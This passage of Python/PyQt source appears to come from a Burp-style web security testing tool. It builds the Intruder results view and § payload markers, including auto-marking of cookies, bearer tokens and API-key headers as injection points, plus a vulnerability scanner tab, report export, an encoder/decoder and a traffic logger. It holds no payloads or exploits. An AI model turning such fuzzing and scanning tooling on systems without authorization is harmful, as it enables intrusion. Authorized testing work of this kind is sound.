                    tbl.setRowHidden(row, False)
                    continue
                match = any(text in (tbl.item(row, c).text() if tbl.item(row, c) else '').lower()
                           for c in range(tbl.columnCount()))
                tbl.setRowHidden(row, not match)
        search_edit.textChanged.connect(_apply_filter)

        def _ctx_menu(pos):
            item = tbl.itemAt(pos)
            if not item:
                return
            row = item.row()
            data = row_data.get(row, {})
            menu = QMenu(dlg)
            a_copy = menu.addAction("📋 Copy Response")
            a_curl = menu.addAction("⌨ Copy as cURL")
            a_rep = menu.addAction("🔁 Send to Repeater")
            menu.addSeparator()
            hl_menu = menu.addMenu("🎨 Highlight Row")
            hl_actions = {}
            for label, color in [("Red", "#ef4444"), ("Orange", "#f97316"), ("Yellow", "#eab308"),
                                  ("Green", "#22c55e"), ("Blue", "#3b82f6"), ("None", "")]:
                hl_actions[hl_menu.addAction(label)] = color
            act = menu.exec(tbl.viewport().mapToGlobal(pos))
            if act == a_copy:
                QApplication.clipboard().setText(data.get('response', ''))
            elif act == a_curl:
                import shlex
                h_str, b_str = engine._build_request(data.get('replacements', {}))
                curl = f"curl -X {engine.method} {shlex.quote(engine.url)}"
                for line in h_str.split('\n'):
                    if ':' in line:
                        curl += f" -H {shlex.quote(line.strip())}"
                if b_str.strip():
                    curl += f" -d {shlex.quote(b_str)}"
                QApplication.clipboard().setText(curl)
            elif act == a_rep:
                h_str, b_str = engine._build_request(data.get('replacements', {}))
                req_headers = {}
                for line in h_str.split('\n'):
                    if ':' in line:
                        k, v = line.split(':', 1)
                        req_headers[k.strip()] = v.strip()
                synthetic = {
                    'method': engine.method, 'url': engine.url, 'path': '/',
                    'req_headers': req_headers,
                    'req_body': b_str.encode('utf-8', 'replace'),
                }
                self._send_to_rep(synthetic)
            elif act in hl_actions:
                color = hl_actions[act]
                for c in range(tbl.columnCount()):
                    it = tbl.item(row, c)
                    if it:
                        it.setBackground(QBrush(QColor(color + "33")) if color else QBrush())
        tbl.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        tbl.customContextMenuRequested.connect(_ctx_menu)

        def _export_csv():
            path, _ = QFileDialog.getSaveFileName(dlg, "Export Results", "intruder_results.csv", "CSV (*.csv)")
            if not path:
                return
            import csv as _csv
            with open(path, 'w', newline='', encoding='utf-8') as f:
                writer = _csv.writer(f)
                writer.writerow(cols)
                for row in range(tbl.rowCount()):
                    writer.writerow([tbl.item(row, c).text() if tbl.item(row, c) else ''
                                     for c in range(tbl.columnCount())])
            self._log(f"Intruder results exported: {path}")
        export_btn.clicked.connect(_export_csv)
        repeat_btn.clicked.connect(self._start_intruder)

        dlg.show()
        info = {
            'dialog': dlg, 'table': tbl, 'row_data': row_data,
            'progress': prog, 'status': status_lbl, 'n_positions': n_positions,
            'cols': cols, 'engine': engine,
        }
        self._intr_result_dialogs.append(info)
        return info

    def _intr_add_result_row(self, dlg_info, r: dict):
        tbl = dlg_info['table']
        tbl.setSortingEnabled(False)
        row = tbl.rowCount()
        tbl.insertRow(row)
        req_label = "base" if r.get('is_baseline') else str(r['idx'] + 1)
        replacements = r.get('replacements', {})
        n_pos = dlg_info['n_positions']
        payload_cells = [replacements.get(i, '') for i in range(n_pos)]
        status_col = 1 + n_pos
        numeric_cols = {status_col, status_col + 1, status_col + 2}
        vals = ([req_label] + payload_cells + [
            str(r['status']) if r['status'] else '0',
            f"{r['dur'] * 1000:.0f}",
            str(r['length']),
            "✓" if r.get('grep_hit') else "",
            r.get('error', ''),
            "",
        ])
        for c, val in enumerate(vals):
            item = _NumericTableItem(val) if c in numeric_cols or c == 0 else QTableWidgetItem(val)
            if c == status_col:
                item.setForeground(QBrush(QColor(status_color(r['status']))))
            if r.get('is_baseline'):
                item.setBackground(QBrush(QColor(T.BLUE + "22")))
            tbl.setItem(row, c, item)
        dlg_info['row_data'][row] = r
        tbl.setSortingEnabled(True)

    def _intr_on_progress(self, dlg_info, done, total):
        if total:
            dlg_info['progress'].setMaximum(total)
            dlg_info['progress'].setValue(done)
        dlg_info['status'].setText(f"Running… {done}/{total}")
        if hasattr(self, 'intr_prog'):
            self.intr_prog.setMaximum(max(total, 1))
            self.intr_prog.setValue(done)
            self.intr_status_lbl.setText(f"{done}/{total}")

    def _intr_on_finished(self, dlg_info, msg: str):
        dlg_info['status'].setText(f"Finished — {msg}")
        dlg_info['progress'].setValue(dlg_info['progress'].maximum() or 1)
        self.intr_start.setEnabled(True)
        self.intr_stop.setEnabled(False)
        self.intr_prog.setVisible(False)
        self.intr_status_lbl.setText("Finished")
        self._log(msg)

    # ---------- Intruder: position markers (Burp-style §...§) ----------
    def _on_intr_focus_changed(self, old, new):
        """Track whichever of Headers/Body last had focus, so toolbar buttons
        know where to act even after focus moves to the button itself."""
        if new is self.intr_headers or new is self.intr_body:
            self._intr_active_editor = new

    def _intr_update_marker_count(self):
        if not hasattr(self, 'intr_marker_count_lbl'):
            return
        n = (len(re.findall(r'§[^§]*§', self.intr_headers.toPlainText())) +
             len(re.findall(r'§[^§]*§', self.intr_body.toPlainText())))
        self.intr_marker_count_lbl.setText(f"{n} position{'s' if n != 1 else ''}")
        if hasattr(self, 'intr_pos_combo'):
            self._intr_refresh_position_combo()
            self._intr_update_counts()

    def _intr_add_marker(self):
        """Wrap the current selection in § markers; with no selection, drop
        an empty §§ pair at the cursor for the user to fill in."""
        editor = getattr(self, '_intr_active_editor', None) or self.intr_body
        cursor = editor.textCursor()
        if cursor.hasSelection():
            text = cursor.selectedText().replace('\u2029', '\n')
            cursor.insertText(f"§{text}§")
        else:
            pos = cursor.position()
            cursor.insertText("§§")
            cursor.setPosition(pos + 1)
        editor.setTextCursor(cursor)
        editor.setFocus()
        self._intr_update_marker_count()
        self._log("Added § marker")

    def _intr_clear_markers(self):
        """Remove every § marker from BOTH Headers and Body, keeping the
        original wrapped text in place."""
        pattern = re.compile(r'§([^§]*)§')
        removed = 0
        for editor in (self.intr_headers, self.intr_body):
            text = editor.toPlainText()
            new_text, n = pattern.subn(r'\1', text)
            if n:
                editor.blockSignals(True)
                editor.setPlainText(new_text)
                editor.blockSignals(False)
                removed += n
        self._intr_update_marker_count()
        self._log(f"Cleared {removed} § marker(s)" if removed else "No § markers to clear")

    def _intr_auto_markers(self):
        """Auto-detect likely injection points across Headers + Body —
        form/JSON parameter values, cookie values, bearer tokens — and
        wrap each one in § markers."""
        new_headers, n_hdr = self._auto_mark_headers(self.intr_headers.toPlainText())
        new_body, n_body = self._auto_mark_body(self.intr_body.toPlainText())
        if n_hdr:
            self.intr_headers.blockSignals(True)
            self.intr_headers.setPlainText(new_headers)
            self.intr_headers.blockSignals(False)
        if n_body:
            self.intr_body.blockSignals(True)
            self.intr_body.setPlainText(new_body)
            self.intr_body.blockSignals(False)
        self._intr_update_marker_count()
        total = n_hdr + n_body
        self._log(f"Auto-marked {total} position(s)" if total else "Auto §: no parameters detected")

    def _auto_mark_body(self, text: str) -> Tuple[str, int]:
        if not text.strip():
            return text, 0
        count = [0]
        try:
            json.loads(text)
            is_json = True
        except Exception:
            is_json = False
        if is_json:
            def repl_str(m):
                count[0] += 1
                return f'"{m.group(1)}"{m.group(2)}"§{m.group(3)}§"'
            text = re.sub(r'"([^"\\]+)"(\s*:\s*)"((?:[^"\\§]|\\.)*)"', repl_str, text)

            def repl_lit(m):
                count[0] += 1
                return f'"{m.group(1)}"{m.group(2)}§{m.group(3)}§'
            text = re.sub(r'"([^"\\]+)"(\s*:\s*)(-?\d+(?:\.\d+)?|true|false|null)\b', repl_lit, text)
            return text, count[0]
        if '=' in text:
            def repl_kv(m):
                key, val = m.group(1), m.group(2)
                if not val:
                    return m.group(0)
                count[0] += 1
                return f"{key}=§{val}§"
            text = re.sub(r'([\w.\[\]-]+)=([^&\n§]*)', repl_kv, text)
            return text, count[0]
        return text, 0

    def _auto_mark_headers(self, text: str) -> Tuple[str, int]:
        if not text.strip():
            return text, 0
        count = [0]
        out_lines = []
        for line in text.split('\n'):
            if ':' not in line:
                out_lines.append(line)
                continue
            key, val = line.split(':', 1)
            key_s = key.strip()
            val_s = val.strip()
            kl = key_s.lower()
            if kl == 'cookie':
                def repl_cookie(m):
                    count[0] += 1
                    return f"{m.group(1)}=§{m.group(2)}§"
                new_val = re.sub(r'([\w.\-]+)=([^;§]+)', repl_cookie, val_s)
                out_lines.append(f"{key_s}: {new_val}")
            elif kl == 'authorization' and 'bearer' in val_s.lower():
                def repl_bearer(m):
                    count[0] += 1
                    return f"Bearer §{m.group(1)}§"
                new_val = re.sub(r'[Bb]earer\s+([^\s§]+)', repl_bearer, val_s)
                out_lines.append(f"{key_s}: {new_val}")
            elif kl in ('x-api-key', 'x-auth-token', 'x-csrf-token', 'api-key') and val_s and '§' not in val_s:
                count[0] += 1
                out_lines.append(f"{key_s}: §{val_s}§")
            else:
                out_lines.append(line)
        return '\n'.join(out_lines), count[0]

    def _intr_editor_ctx(self, editor: QPlainTextEdit, pos):
        """Right-click menu for the Headers/Body editors: standard
        cut/copy/paste plus the same § marker actions as the toolbar."""
        self._intr_active_editor = editor
        menu = editor.createStandardContextMenu()
        menu.addSeparator()
        a_add = menu.addAction("➕ Add §")
        a_clear = menu.addAction("🧹 Clear § markers")
        a_auto = menu.addAction("🎯 Auto § (detect parameters)")
        action = menu.exec(editor.viewport().mapToGlobal(pos))
        if action == a_add:
            self._intr_add_marker()
        elif action == a_clear:
            self._intr_clear_markers()
        elif action == a_auto:
            self._intr_auto_markers()

    # ---------- Scanner ----------
    def _scanner_tab(self):
        w = QWidget()
        root = QVBoxLayout(w); root.setContentsMargins(0,0,0,0); root.setSpacing(0)

        # ── Top control bar ──────────────────────────────────────────────────
        ctl = QWidget(); ctl.setFixedHeight(44)
        ctl.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        cl = QHBoxLayout(ctl); cl.setContentsMargins(10,0,10,0); cl.setSpacing(6)
        cl.addWidget(QLabel("Target:"))
        self.scan_url = QLineEdit()
        self.scan_url.setPlaceholderText("https://target.com  — leave blank for passive scan of proxy traffic")
        self.scan_url.setFixedHeight(28)
        self.scan_start = self._btn("▶ Start Scan", "primary", h=28)
        self.scan_stop  = self._btn("⏹ Stop",       "danger",  h=28)
        self.scan_stop.setEnabled(False)
        self._scan_export_btn = self._btn("📄 Export HTML", h=28)
        cl.addWidget(self.scan_url, 1)
        cl.addWidget(self.scan_start); cl.addWidget(self.scan_stop)
        cl.addWidget(self.scan_stop); cl.addSpacing(8); cl.addWidget(self._scan_export_btn)
        root.addWidget(ctl)

        # ── Scan type + severity filter bar ─────────────────────────────────
        fb = QWidget(); fb.setFixedHeight(36)
        fb.setStyleSheet(f"background:{T.SURFACE};border-bottom:1px solid {T.BORDER};")
        fl = QHBoxLayout(fb); fl.setContentsMargins(10,0,10,0); fl.setSpacing(8)
        fl.addWidget(QLabel("Mode:"))
        self.scan_mode = QComboBox()
        self.scan_mode.addItems(["Full Scan", "Quick (Headers+CORS+TLS)", "Passive (Traffic Only)", "Injection Only", "Auth & Session"])
        self.scan_mode.setFixedHeight(24)
        fl.addWidget(self.scan_mode); fl.addSpacing(16)
        fl.addWidget(QLabel("Filter:"))
        self._sev_filters = {}
        for sev, col in [("Critical", T.RED if hasattr(T,'RED') else "#ef4444"),
                          ("High",     "#f97316"), ("Medium", "#eab308"),
                          ("Low",      "#06b6d4"), ("Info",   "#64748b")]:
            chk = QCheckBox(sev)
            chk.setChecked(True)
            chk.setStyleSheet(f"color:{col};font-size:11px;font-weight:600")
            chk.toggled.connect(self._scan_apply_filter)
            fl.addWidget(chk)
            self._sev_filters[sev.lower()] = chk
        fl.addStretch()
        self._scan_count_lbl = QLabel("0 findings")
        self._scan_count_lbl.setStyleSheet(f"color:{T.TXT2};font-size:11px;font-weight:600")
        fl.addWidget(self._scan_count_lbl)
        root.addWidget(fb)

        # ── Progress bar ─────────────────────────────────────────────────────
        self.scan_prog = QProgressBar(); self.scan_prog.setFixedHeight(4)
        self.scan_prog.setTextVisible(False)
        self.scan_prog.setStyleSheet(
            f"QProgressBar{{background:{T.SURFACE};border:none;border-radius:0;}}"
            f"QProgressBar::chunk{{background:{T.BLUE};border-radius:0;}}")
        root.addWidget(self.scan_prog)

        # ── Main split: findings tree | detail panel ─────────────────────────
        sp = QSplitter(Qt.Orientation.Vertical)

        # Findings tree
        self.scan_tree = QTreeWidget()
        self.scan_tree.setHeaderLabels(["#", "Severity", "Vulnerability", "URL", "CWE", "CVSS", "Confidence"])
        self.scan_tree.setAlternatingRowColors(True)
        self.scan_tree.setSortingEnabled(True)
        self.scan_tree.header().setSectionResizeMode(2, self.scan_tree.header().ResizeMode.Stretch)
        self.scan_tree.header().setDefaultSectionSize(90)
        self.scan_tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.scan_tree.customContextMenuRequested.connect(self._scan_ctx)
        self.scan_tree.currentItemChanged.connect(self._scan_item_selected)
        sp.addWidget(self.scan_tree)

        # Detail panel
        detail_w = QWidget()
        dv = QVBoxLayout(detail_w); dv.setContentsMargins(0,0,0,0); dv.setSpacing(0)
        detail_tabs = QTabWidget()
        detail_tabs.setStyleSheet(
            f"QTabWidget::pane{{border:none;background:{T.BG};}}"
            f"QTabBar::tab{{padding:4px 14px;font-size:11px;background:{T.PANEL};"
            f"color:{T.TXT3};border-bottom:2px solid transparent;}}"
            f"QTabBar::tab:selected{{color:{T.BLUE};border-bottom:2px solid {T.BLUE};}}")
        self.scan_detail_desc = QPlainTextEdit(); self.scan_detail_desc.setReadOnly(True); self.scan_detail_desc.setFont(mono_font(10))
        self.scan_detail_req  = QPlainTextEdit(); self.scan_detail_req.setReadOnly(True);  self.scan_detail_req.setFont(mono_font(10))
        self.scan_detail_resp = QPlainTextEdit(); self.scan_detail_resp.setReadOnly(True); self.scan_detail_resp.setFont(mono_font(10))
        self.scan_detail_fix  = QPlainTextEdit(); self.scan_detail_fix.setReadOnly(True);  self.scan_detail_fix.setFont(mono_font(10))
        HTTPHighlighter(self.scan_detail_req.document())
        HTTPHighlighter(self.scan_detail_resp.document())
        detail_tabs.addTab(self.scan_detail_desc, "Description")
        detail_tabs.addTab(self.scan_detail_req,  "Request Evidence")
        detail_tabs.addTab(self.scan_detail_resp, "Response Evidence")
        detail_tabs.addTab(self.scan_detail_fix,  "Remediation")
        dv.addWidget(detail_tabs)
        sp.addWidget(detail_w)
        sp.setSizes([380, 220])
        root.addWidget(sp, 1)

        # ── Log strip ────────────────────────────────────────────────────────
        self.scan_log = QPlainTextEdit(); self.scan_log.setReadOnly(True)
        self.scan_log.setFont(mono_font(9)); self.scan_log.setFixedHeight(72)
        self.scan_log.setStyleSheet(f"background:{T.PANEL};border-top:1px solid {T.BORDER};color:{T.TXT2};padding:4px;")
        root.addWidget(self.scan_log)

        # Store all findings for filter/export
        self._scan_findings: List[dict] = []

        self.scan_start.clicked.connect(self._start_scanner)
        self.scan_stop.clicked.connect(self._stop_scanner)
        self._scan_export_btn.clicked.connect(self._scan_export_html)
        return w

    def _scan_item_selected(self, current, _prev):
        if not current:
            return
        r = current.data(0, Qt.ItemDataRole.UserRole)
        if not r:
            return
        self.scan_detail_desc.setPlainText(
            f"Vulnerability: {r.get('vuln_type','')}\n"
            f"Severity:      {r.get('severity','').upper()}\n"
            f"CWE:           {r.get('cwe','')}\n"
            f"CVSS:          {r.get('cvss', 0)}\n"
            f"Confidence:    {r.get('confidence','')}\n"
            f"URL:           {r.get('url','')}\n\n"
            f"Description:\n{r.get('desc','')}\n\n"
            f"References:\n  https://owasp.org/www-project-top-ten/\n  https://cwe.mitre.org/data/definitions/{r.get('cwe','').replace('CWE-','')}.html")
        self.scan_detail_req.setPlainText(r.get('req_ev', ''))
        self.scan_detail_resp.setPlainText(r.get('resp_ev', ''))
        self.scan_detail_fix.setPlainText(r.get('fix', ''))

    def _scan_ctx(self, pos):
        item = self.scan_tree.itemAt(pos)
        if not item:
            return
        r = item.data(0, Qt.ItemDataRole.UserRole)
        menu = QMenu()
        a_rep   = menu.addAction("🔁 Send to Repeater")
        a_intr  = menu.addAction("💣 Send to Intruder")
        menu.addSeparator()
        a_copy  = menu.addAction("📋 Copy Finding")
        a_poc   = menu.addAction("🧪 Copy PoC Request")
        menu.addSeparator()
        a_del   = menu.addAction("🗑 Delete Finding")
        act = menu.exec(self.scan_tree.viewport().mapToGlobal(pos))
        if not r:
            return
        if act == a_rep:
            req_ev = r.get('req_ev','')
            msg = {'method': 'GET', 'url': r.get('url',''), 'path': '/', 'req_headers': {}, 'req_body': b''}
            m2 = re.match(r'(GET|POST|PUT|DELETE|PATCH|HEAD)\s+(\S+)', req_ev or '')
            if m2:
                msg['method'] = m2.group(1)
            self._send_to_rep(msg)
        elif act == a_intr:
            self.intr_url.setText(r.get('url',''))
            self.tabs.setCurrentIndex(3)
        elif act == a_copy:
            text = (f"[{r.get('severity','').upper()}] {r.get('vuln_type','')}\n"
                    f"CWE: {r.get('cwe','')}  CVSS: {r.get('cvss',0)}\n"
                    f"URL: {r.get('url','')}\n"
                    f"Desc: {r.get('desc','')}\n"
                    f"Fix: {r.get('fix','')}")
            QApplication.clipboard().setText(text)
        elif act == a_poc:
            QApplication.clipboard().setText(r.get('req_ev',''))
        elif act == a_del:
            idx = self.scan_tree.indexOfTopLevelItem(item)
            self.scan_tree.takeTopLevelItem(idx)
            if r in self._scan_findings:
                self._scan_findings.remove(r)
            self._scan_update_count()

    def _scan_apply_filter(self):
        enabled = {s for s, chk in self._sev_filters.items() if chk.isChecked()}
        for i in range(self.scan_tree.topLevelItemCount()):
            it = self.scan_tree.topLevelItem(i)
            r  = it.data(0, Qt.ItemDataRole.UserRole)
            sev = (r.get('severity','') if r else '').lower()
            it.setHidden(sev not in enabled)

    def _scan_update_count(self):
        n = len(self._scan_findings)
        sev_cnt = {}
        for r in self._scan_findings:
            s = r.get('severity','').lower()
            sev_cnt[s] = sev_cnt.get(s, 0) + 1
        parts = [f"{sev_cnt.get(s,0)} {s}" for s in ('critical','high','medium','low','info') if sev_cnt.get(s,0)]
        self._scan_count_lbl.setText(f"{n} finding{'s' if n!=1 else ''}  " + "  ".join(parts))

    def _start_scanner(self):
        url = self.scan_url.text().strip()
        mode = self.scan_mode.currentText()
        self.scan_tree.clear(); self.scan_log.clear()
        self._scan_findings.clear()
        self._scan_update_count()
        self.scan_start.setEnabled(False); self.scan_stop.setEnabled(True)
        self.scan_prog.setValue(0)
        if mode == "Passive (Traffic Only)":
            self._scanner = Scanner(url or "passive", self.db, mode=mode,
                                    passive_msgs=list(self.db.recent))
        else:
            if not url:
                QMessageBox.warning(self, "Scanner", "Enter a target URL for active scanning.")
                self.scan_start.setEnabled(True); self.scan_stop.setEnabled(False)
                return
            self._scanner = Scanner(url, self.db, mode=mode)
        self._scanner.finding.connect(self._scan_finding)
        self._scanner.progress.connect(lambda p, m: (self.scan_prog.setValue(p), self.scan_log.appendPlainText(m)))
        self._scanner.log.connect(lambda m: self.scan_log.appendPlainText(m))
        self._scanner.done.connect(lambda n: (
            self.scan_start.setEnabled(True),
            self.scan_stop.setEnabled(False),
            self.scan_prog.setValue(100),
            self._log(f"[Scanner] {n} findings")
        ))
        self._scanner.start()
        self._log(f"Scanner started: {url or 'passive'} [{mode}]")

    def _scan_finding(self, r: dict):
        self._scan_findings.append(r)
        sev = r.get('severity','')
        col = {'critical':"#ec4899",'high':T.RED,'medium':"#eab308",'low':"#06b6d4",'info':T.TXT2}.get(sev, T.TXT2)
        n   = len(self._scan_findings)
        sev_icon = {'critical':'🔴','high':'🟠','medium':'🟡','low':'🔵','info':'⚪'}.get(sev,'⚪')
        item = QTreeWidgetItem([str(n), f"{sev_icon} {sev.upper()}",
                                r.get('vuln_type',''), r.get('url','')[:60],
                                r.get('cwe',''), str(r.get('cvss',0)),
                                r.get('confidence','medium')])
        item.setForeground(1, QBrush(QColor(col)))
        item.setData(0, Qt.ItemDataRole.UserRole, r)
        self.scan_tree.addTopLevelItem(item)
        self._scan_apply_filter()
        self._scan_update_count()

    def _stop_scanner(self):
        if self._scanner:
            self._scanner.stop()
        self.scan_start.setEnabled(True); self.scan_stop.setEnabled(False)
        self._log("[Scanner] Stopped")

    def _scan_export_html(self):
        if not self._scan_findings:
            QMessageBox.information(self, "Export", "No findings to export. Run a scan first.")
            return
        import html as _html
        scans = self._scan_findings
        SEV_COL = {"critical":"#ec4899","high":"#ef4444","medium":"#eab308","low":"#06b6d4","info":"#64748b"}
        SEV_ORD = {"critical":0,"high":1,"medium":2,"low":3,"info":4}
        scans = sorted(scans, key=lambda r: SEV_ORD.get(r.get("severity","info"), 5))

        def _row(r):
            col  = SEV_COL.get(r.get("severity",""), "#64748b")
            sev  = _html.escape(r.get("severity","").upper())
            vt   = _html.escape(r.get("vuln_type",""))
            url2 = _html.escape(r.get("url",""))
            desc = _html.escape(r.get("desc","")[:120])
            cwe  = _html.escape(str(r.get("cwe","")))
            cvss = r.get("cvss",0)
            return (f"<tr><td style='color:{col};font-weight:700'>{sev}</td>"
                    f"<td><b>{vt}</b></td><td>{url2}</td><td>{desc}</td>"
                    f"<td>{cwe}</td><td>{cvss}</td></tr>")

        rows = "".join(_row(r) for r in scans)
        html = (f"<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Kingception Scan Report</title>"
                f"<style>*{{box-sizing:border-box}}body{{background:#07101d;color:#e2e8f0;font-family:Inter,sans-serif;font-size:14px}}"
                f".c{{max-width:1100px;margin:0 auto;padding:32px}}h1{{color:#4d8ef7}}table{{width:100%;border-collapse:collapse;background:#0f1d30;border:1px solid #1a2d4a;border-radius:7px}}"
                f"th{{background:#0b1523;color:#94a3b8;padding:8px 12px;text-align:left;font-size:11px;text-transform:uppercase}}td{{padding:8px 12px;border-bottom:1px solid #152236;font-size:13px}}"
                f"</style></head><body><div class='c'><h1>⚡ Kingception Security Report</h1>"
                f"<p style='color:#94a3b8'>{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')} · {len(scans)} findings</p>"
                f"<table><thead><tr><th>Severity</th><th>Type</th><th>URL</th><th>Description</th><th>CWE</th><th>CVSS</th></tr></thead><tbody>{rows}</tbody></table></div></body></html>")
        path, _ = QFileDialog.getSaveFileName(self, "Export Report", "scan_report.html", "HTML (*.html)")
        if path:
            open(path,"w",encoding="utf-8").write(html)
            webbrowser.open(f"file://{os.path.abspath(path)}")
            self._log(f"Report exported: {path}")

    # ---------- Decoder ----------
    def _decoder_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(8, 8, 8, 8)
        v.addWidget(QLabel("Encoder / Decoder — multi-step chains supported"))
        self.dec_in = QPlainTextEdit()
        self.dec_in.setFont(mono_font(11))
        self.dec_in.setPlaceholderText("Enter text to encode or decode…")
        v.addWidget(self.dec_in)
        bar = QHBoxLayout()
        self.dec_type = QComboBox()
        self.dec_type.addItems(["Base64", "Base64 URL-safe", "URL Encode", "Hex",
                                "HTML Entity", "JWT Decode", "MD5 Hash", "SHA-256 Hash", "ROT13"])
        bar.addWidget(self.dec_type)
        enc_btn = self._btn("Encode ▶", "primary", h=30)
        dec_btn = self._btn("◀ Decode", "success", h=30)
        bar.addWidget(dec_btn)
        bar.addWidget(enc_btn)
        bar.addStretch()
        v.addLayout(bar)
        self.dec_out = QPlainTextEdit()
        self.dec_out.setReadOnly(True)
        self.dec_out.setFont(mono_font(11))
        v.addWidget(self.dec_out)
        enc_btn.clicked.connect(lambda: self._run_decode(encode=True))
        dec_btn.clicked.connect(lambda: self._run_decode(encode=False))
        return w

    def _run_decode(self, encode: bool):
        text = self.dec_in.toPlainText()
        t = self.dec_type.currentText()
        try:
            if t == "Base64":
                out = base64.b64encode(text.encode()).decode() if encode else base64.b64decode(text).decode('utf-8', 'replace')
            elif t == "Base64 URL-safe":
                out = base64.urlsafe_b64encode(text.encode()).decode() if encode else base64.urlsafe_b64decode(text + '==' * 3).decode('utf-8', 'replace')
            elif t == "URL Encode":
                out = url_quote(text, safe='') if encode else url_unquote(text)
            elif t == "Hex":
                out = text.encode().hex() if encode else bytes.fromhex(text).decode('utf-8', 'replace')
            elif t == "HTML Entity":
                import html
                out = html.escape(text) if encode else html.unescape(text)
            elif t == "JWT Decode":
                d = JWTAnalyzer.decode(text)
                out = json.dumps(d, indent=2)
            elif t == "MD5 Hash":
                out = hashlib.md5(text.encode()).hexdigest()
            elif t == "SHA-256 Hash":
                out = hashlib.sha256(text.encode()).hexdigest()
            elif t == "ROT13":
                import codecs
                out = codecs.encode(text, 'rot_13')
            else:
                out = text
            self.dec_out.setPlainText(out)
        except Exception as e:
            self.dec_out.setPlainText(f"Error: {e}")

    # ---------- Logger Tab ----------
    def _logger_tab(self):
        w = QWidget()
        root = QVBoxLayout(w); root.setContentsMargins(0,0,0,0); root.setSpacing(0)

        # ── Stats bar ────────────────────────────────────────────────────────
        stats_bar = QWidget(); stats_bar.setFixedHeight(30)
        stats_bar.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        sl = QHBoxLayout(stats_bar); sl.setContentsMargins(10,0,10,0); sl.setSpacing(16)
        self._log_stat_total  = QLabel("0 requests")
        self._log_stat_2xx    = QLabel("2xx: 0")
        self._log_stat_3xx    = QLabel("3xx: 0")
        self._log_stat_4xx    = QLabel("4xx: 0")
        self._log_stat_5xx    = QLabel("5xx: 0")
        self._log_stat_errors = QLabel("Errors: 0")
        self._log_stat_size   = QLabel("0 B total")
        for lbl, col in [
            (self._log_stat_total,  T.TXT2),
            (self._log_stat_2xx,    T.GREEN),
            (self._log_stat_3xx,    T.BLUE),
            (self._log_stat_4xx,    T.YELLOW),
            (self._log_stat_5xx,    T.RED),
            (self._log_stat_errors, "#ec4899"),
            (self._log_stat_size,   T.TXT3),
        ]:
            lbl.setStyleSheet(f"color:{col};font-size:11px;font-weight:600;font-family:{T.MONO};")
            sl.addWidget(lbl)
        sl.addStretch()
        root.addWidget(stats_bar)

        # ── Filter bar ───────────────────────────────────────────────────────
        fb = QWidget(); fb.setFixedHeight(36)
        fb.setStyleSheet(f"background:{T.SURFACE};border-bottom:1px solid {T.BORDER};")
        fl = QHBoxLayout(fb); fl.setContentsMargins(8,0,8,0); fl.setSpacing(6)
        fl.addWidget(QLabel("🔍"))
        self._log_filter = QLineEdit()
        self._log_filter.setPlaceholderText("Live filter: host, path, status, content-type…  (supports regex)")
        self._log_filter.setFixedHeight(24)
        self._log_filter_regex = QCheckBox("Regex")
        self._log_neg          = QCheckBox("Negate")
        self._log_m_filter = QComboBox()
        self._log_m_filter.addItems(["All Methods","GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS"])
        self._log_m_filter.setFixedHeight(24)
        self._log_s_filter = QComboBox()
        self._log_s_filter.addItems(["All Status","2xx","3xx","4xx","5xx","0 (error)"])
        self._log_s_filter.setFixedHeight(24)
        self._log_ct_filter = QComboBox()
        self._log_ct_filter.addItems(["All Types","JSON","HTML","XML","JavaScript","CSS","Image","Other"])
        self._log_ct_filter.setFixedHeight(24)
        clr_filter_btn = self._btn("✕", h=24, w=24)
        clr_filter_btn.setToolTip("Clear filter")
        fl.addWidget(self._log_filter, 1)
        fl.addWidget(self._log_filter_regex)
        fl.addWidget(self._log_neg)
        fl.addWidget(QLabel("Method:"))
        fl.addWidget(self._log_m_filter)
        fl.addWidget(QLabel("Status:"))
        fl.addWidget(self._log_s_filter)
        fl.addWidget(QLabel("Type:"))
        fl.addWidget(self._log_ct_filter)
        fl.addWidget(clr_filter_btn)
        root.addWidget(fb)

        # ── Logger table ─────────────────────────────────────────────────────
        self._logger_tbl = QTableWidget(0, 9)
        self._logger_tbl.setHorizontalHeaderLabels(
            ["#","Time","Method","Host","Path","Status","Size","Duration","Content-Type"])
        hh = self._logger_tbl.horizontalHeader()
        hh.setSectionResizeMode(4, hh.ResizeMode.Stretch)
        for i, w2 in enumerate([42, 88, 68, 165, 0, 62, 74, 72, 130]):
            if w2: self._logger_tbl.setColumnWidth(i, w2)
        self._logger_tbl.setAlternatingRowColors(True)
        self._logger_tbl.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self._logger_tbl.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self._logger_tbl.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self._logger_tbl.customContextMenuRequested.connect(self._logger_ctx)
        self._logger_tbl.currentItemChanged.connect(self._logger_item_click2)
        self._logger_tbl.setSortingEnabled(True)

        # ── Split: table | detail ─────────────────────────────────────────────
        sp = QSplitter(Qt.Orientation.Vertical)
        sp.addWidget(self._logger_tbl)

        detail_w = QWidget()
        dv = QVBoxLayout(detail_w); dv.setContentsMargins(0,0,0,0); dv.setSpacing(0)
        det_tabs = QTabWidget()
        det_tabs.setStyleSheet(
            f"QTabWidget::pane{{border:none;background:{T.BG};}}"
            f"QTabBar::tab{{padding:3px 12px;font-size:11px;background:{T.PANEL};"
            f"color:{T.TXT3};border-bottom:2px solid transparent;}}"
            f"QTabBar::tab:selected{{color:{T.BLUE};border-bottom:2px solid {T.BLUE};}}")
        self._log_req_view  = QPlainTextEdit(); self._log_req_view.setReadOnly(True)
        self._log_resp_view = QPlainTextEdit(); self._log_resp_view.setReadOnly(True)
        self._log_summary   = QPlainTextEdit(); self._log_summary.setReadOnly(True)
        for pe in (self._log_req_view, self._log_resp_view, self._log_summary):
            pe.setFont(mono_font(10))
            pe.setLineWrapMode(QPlainTextEdit.LineWrapMode.NoWrap)
        HTTPHighlighter(self._log_req_view.document())
        HTTPHighlighter(self._log_resp_view.document())
        det_tabs.addTab(self._log_req_view,  "📤 Request")
        det_tabs.addTab(self._log_resp_view, "📥 Response")
        det_tabs.addTab(self._log_summary,   "ℹ Summary")
        dv.addWidget(det_tabs)
